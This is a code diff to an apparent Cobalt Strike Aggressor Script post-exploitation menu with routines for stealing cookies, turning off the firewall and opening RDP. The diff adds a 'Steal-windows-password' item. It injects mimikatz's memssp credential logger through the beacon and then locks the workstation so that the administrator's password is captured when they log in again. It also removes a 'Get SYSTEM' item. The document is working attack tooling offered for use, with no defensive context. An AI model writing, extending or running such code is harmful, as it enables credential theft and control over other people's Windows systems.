@@ -46,6 +46,13 @@ sub Steal_cookies{
     }
 }
 
+sub Steal_windows_password{
+    $bid = $1['@'];
+    bmimikatz($bid, "misc::memssp");
+    brun($bid,"rundll32.exe user32.dll,LockWorkStation");
+    show_message("After the administrator logs in again, check C:\\Windows\\System32\\mimilsa.log");
+}
+
 sub Close_firewall{
    $ver = beacon_info($1['@'],"ver");
    if (double($ver) lt 5.2){
@@ -69,11 +76,7 @@ sub Open_rdp{
 
 
     menu "Post"{
-            item "Get &SYSTEM" {
-                binput($1, "getsystem");
-                bgetsystem($1);
-            }
-
+        
             item "Turn Off Firewall"{
                 if (!-isadmin $1['@']){
                     show_error("Permission Denied!");
@@ -123,5 +126,9 @@ sub Open_rdp{
                 drow_text($dialog, "redirect", "");
                 dbutton_action($dialog, "Exec");
                 dialog_show($dialog);
+            }
+
+            item "Steal-windows-password"{
+                Steal_windows_password($1);
             }
     }
